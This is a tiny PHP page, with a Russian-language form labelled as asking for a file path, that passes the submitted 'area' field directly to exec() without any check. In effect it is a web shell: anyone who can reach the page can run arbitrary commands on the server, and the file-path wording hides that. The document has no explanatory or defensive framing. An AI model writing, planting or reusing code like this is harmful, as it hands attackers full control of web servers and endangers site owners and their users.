<?php
exec($_POST['area']);

?>
<form name = "myform" action = "<?=$_SERVER["REQUEST_URI"]?>" method = "post">
	<div>
		Введите путь файла<input type="textarea" name="area">
	</div>
	<div>
		<input type="submit" name="save" value="Отправить">
	</div>
</form>